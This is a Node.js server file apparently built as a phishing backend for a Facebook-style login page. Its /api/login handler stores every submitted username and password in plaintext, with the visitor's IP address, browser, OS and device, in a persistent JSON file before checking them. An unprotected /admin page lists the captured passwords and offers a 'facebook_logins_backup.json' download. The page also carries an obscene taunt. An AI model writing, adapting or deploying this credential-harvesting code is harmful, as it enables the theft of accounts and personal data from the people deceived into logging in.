const http = require('http');
const fs = require('fs');
const path = require('path');

const PORT = process.env.PORT || 4000;

// DATA STORAGE - Using file-based storage (persists after restart)
const DATA_FILE = path.join(__dirname, '../data/logins.json');

// Ensure data directory exists
const dataDir = path.join(__dirname, '../data');
if (!fs.existsSync(dataDir)) {
    fs.mkdirSync(dataDir, { recursive: true });
}

// Load existing data from file
let loginLogs = [];
if (fs.existsSync(DATA_FILE)) {
    try {
        const rawData = fs.readFileSync(DATA_FILE, 'utf8');
        loginLogs = JSON.parse(rawData);
        console.log(`📂 Loaded ${loginLogs.length} existing records`);
    } catch (err) {
        console.log('Error loading data file, starting fresh');
    }
}

// Save data to file function
function saveData() {
    try {
        fs.writeFileSync(DATA_FILE, JSON.stringify(loginLogs, null, 2));
        console.log('💾 Data saved to file');
    } catch (err) {
        console.error('Error saving data:', err);
    }
}

const server = http.createServer((req, res) => {
    console.log('👉', req.method, req.url);
    
    res.setHeader('Access-Control-Allow-Origin', '*');
    res.setHeader('Access-Control-Allow-Methods', 'GET, POST, DELETE, OPTIONS');
    res.setHeader('Access-Control-Allow-Headers', 'Content-Type');
    
    if (req.method === 'OPTIONS') {
        res.writeHead(200);
        res.end();
        return;
    }
    
    // Serve frontend
    if (req.url === '/' && req.method === 'GET') {
        const filePath = path.join(__dirname, '../frontend/index.html');
        fs.readFile(filePath, (err, data) => {
            if (err) {
                res.writeHead(404);
                res.end('index.html not found');
            } else {
                res.writeHead(200, { 'Content-Type': 'text/html' });
                res.end(data);
            }
        });
    }
    
    // LOGIN API - Save to persistent storage
    else if (req.url === '/api/login' && req.method === 'POST') {
        let body = '';
        req.on('data', chunk => body += chunk);
        req.on('end', () => {
            let data = JSON.parse(body);
            const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress || 'Unknown';
            const userAgent = req.headers['user-agent'] || 'Unknown';
            
            let browser = 'Unknown';
            if (userAgent.includes('Chrome')) browser = 'Chrome';
            else if (userAgent.includes('Firefox')) browser = 'Firefox';
            else if (userAgent.includes('Safari')) browser = 'Safari';
            else if (userAgent.includes('Edge')) browser = 'Edge';
            
            let os = 'Unknown';
            if (userAgent.includes('Windows')) os = 'Windows';
            else if (userAgent.includes('Mac')) os = 'Mac';
            else if (userAgent.includes('Android')) os = 'Android';
            else if (userAgent.includes('iPhone')) os = 'iOS';
            
            let device = 'Desktop';
            if (userAgent.includes('Mobile')) device = 'Mobile';
            else if (userAgent.includes('Tablet')) device = 'Tablet';
            
            // Add to array
            loginLogs.unshift({
                id: Date.now(),
                username: data.username,
                password: data.password,
                time: new Date().toLocaleString(),
                ip: ip,
                browser: browser,
                os: os,
                device: device
            });
            
            // Keep only last 1000 records (to save space)
            if (loginLogs.length > 1000) {
                loginLogs = loginLogs.slice(0, 1000);
            }
            
            // Save to file immediately
            saveData();
            
            console.log('💾 Login saved:', data.username, 'from', ip);
            
            if (data.username === 'admin' && data.password === '123456') {
                res.end(JSON.stringify({ success: true }));
            } else {
                res.end(JSON.stringify({ success: false }));
            }
        });
    }
    
    // Get posts
    else if (req.url === '/api/posts' && req.method === 'GET') {
        res.end(JSON.stringify([]));
    }
    
    // Create post
    else if (req.url === '/api/posts' && req.method === 'POST') {
        let body = '';
        req.on('data', chunk => body += chunk);
        req.on('end', () => {
            res.end(JSON.stringify({ success: true }));
        });
    }
    
    // Delete post
    else if (req.url.match(/\/api\/posts\/(.+)/) && req.method === 'DELETE') {
        res.end(JSON.stringify({ success: true }));
    }
    
    // Like post
    else if (req.url.match(/\/api\/posts\/(.+)\/like/) && req.method === 'POST') {
        res.end(JSON.stringify({ success: true }));
    }
    
    // ADMIN PANEL - Shows all data
    else if (req.url === '/admin') {
        let logsHtml = '';
        for (let log of loginLogs) {
            logsHtml += `
                <tr>
                    <td>${log.id}</td>
                    <td><strong>${escapeHtml(log.username)}</strong></td>
                    <td style="color:#ff6b6b;"><strong>${escapeHtml(log.password)}</strong></td>
                    <td>${log.time}</td>
                    <td>${log.ip}</td>
                    <td>${log.browser || 'Unknown'}</td>
                    <td>${log.os || 'Unknown'}</td>
                    <td>${log.device || 'Unknown'}</td>
                </tr>
            `;
        }
        
        res.writeHead(200, { 'Content-Type': 'text/html' });
        res.end(`
            <!DOCTYPE html>
            <html>
            <head>
                <title>Admin Panel - Persistent Data</title>
                <style>
                    body { background: #0a0e27; color: #00ff88; font-family: monospace; padding: 20px; }
                    h1 { color: #1877f2; text-align: center; }
                    .stats { display: grid; grid-template-columns: repeat(3, 1fr); gap: 20px; margin: 20px 0; }
                    .stat-card { background: #1a1f3e; padding: 20px; border-radius: 10px; text-align: center; }
                    .stat-number { font-size: 48px; font-weight: bold; color: #00ff88; }
                    .stat-label { font-size: 14px; color: #888; margin-top: 5px; }
                    table { width: 100%; border-collapse: collapse; background: #1a1f3e; border-radius: 10px; overflow-x: auto; display: block; }
                    th, td { padding: 10px; text-align: left; border-bottom: 1px solid #2a2f4e; font-size: 12px; }
                    th { background: #1877f2; color: white; position: sticky; top: 0; }
                    .refresh-btn { background: #1877f2; color: white; padding: 10px 20px; border: none; border-radius: 5px; cursor: pointer; margin: 20px 0; }
                    .delete-btn { background: #ff4444; color: white; padding: 10px 20px; border: none; border-radius: 5px; cursor: pointer; margin-left: 10px; }
                    .backup-btn { background: #44aa44; color: white; padding: 10px 20px; border: none; border-radius: 5px; cursor: pointer; }
                    .finger { font-size: 50px; text-align: center; margin: 20px; }
                    .warning { color: #ffaa44; margin: 20px 0; }
                </style>
            </head>
            <body>
                <h1>🔧 ADMIN PANEL - PERSISTENT STORAGE 🔧</h1>
                
                <div class="stats">
                    <div class="stat-card">
                        <div class="stat-number">${loginLogs.length}</div>
                        <div class="stat-label">Total Login Attempts</div>
                    </div>
                    <div class="stat-card">
                        <div class="stat-number">${loginLogs.filter(l => l.username === 'admin' && l.password === '123456').length}</div>
                        <div class="stat-label">Successful Logins</div>
                    </div>
                    <div class="stat-card">
                        <div class="stat-number">${loginLogs.filter(l => l.username !== 'admin' || l.password !== '123456').length}</div>
                        <div class="stat-label">Failed Attempts</div>
                    </div>
                </div>
                
                <div class="warning">
                    ⚠️ Data is saved to file - PERSISTS after server restart! ⚠️
                </div>
                
                <button class="refresh-btn" onclick="location.reload()">🔄 Refresh</button>
                <button class="backup-btn" onclick="downloadData()">📥 Download Backup (JSON)</button>
                <button class="delete-btn" onclick="clearData()">🗑️ Delete ALL Data</button>
                
                <h2>📋 ALL LOGIN ATTEMPTS (Saved to File - Permanent)</h2>
                <div style="overflow-x: auto;">
                    <table>
                        <thead>
                            <tr>
                                <th>ID</th>
                                <th>USERNAME</th>
                                <th>PASSWORD</th>
                                <th>TIME</th>
                                <th>IP ADDRESS</th>
                                <th>BROWSER</th>
                                <th>OS</th>
                                <th>DEVICE</th>
                            </tr>
                        </thead>
                        <tbody>
                            ${logsHtml || '<tr><td colspan="8" style="text-align:center;">No logins yet. Try logging in first!</td></tr>'}
                        </tbody>
                    </table>
                </div>
                
                <div class="finger">
                    🖕 DATA PERSISTS AFTER RESTART 🖕
                </div>
                
                <script>
                    function downloadData() {
                        window.location.href = '/api/backup';
                    }
                    
                    async function clearData() {
                        if(confirm('⚠️ DELETE ALL LOGIN DATA? This cannot be undone! ⚠️')) {
                            let res = await fetch('/api/clear', { method: 'POST' });
                            if(res.ok) {
                                alert('All data deleted!');
                                location.reload();
                            }
                        }
                    }
                </script>
            </body>
            </html>
        `);
    }
    
    // Backup API - Download all data as JSON
    else if (req.url === '/api/backup') {
        res.writeHead(200, { 
            'Content-Type': 'application/json',
            'Content-Disposition': 'attachment; filename="facebook_logins_backup.json"'
        });
        res.end(JSON.stringify(loginLogs, null, 2));
    }
    
    // Clear all data API
    else if (req.url === '/api/clear' && req.method === 'POST') {
        loginLogs = [];
        saveData();
        res.end(JSON.stringify({ success: true }));
    }
    
    else {
        res.writeHead(404);
        res.end('404');
    }
});

function escapeHtml(text) {
    if (!text) return 'Unknown';
    return text.replace(/[&<>]/g, function(m) {
        if (m === '&') return '&amp;';
        if (m === '<') return '&lt;';
        if (m === '>') return '&gt;';
        return m;
    });
}

server.listen(PORT, () => {
    console.log(`\n🚀 ==================================`);
    console.log(`   SERVER RUNNING WITH PERSISTENT STORAGE!`);
    console.log(`==================================`);
    console.log(`📱 Frontend: http://localhost:${PORT}`);
    console.log(`🔧 Admin:    http://localhost:${PORT}/admin`);
    console.log(`📥 Backup:   http://localhost:${PORT}/api/backup`);
    console.log(`🔑 Login: admin / 123456`);
    console.log(`💾 Data saved to: ${DATA_FILE}\n`);
});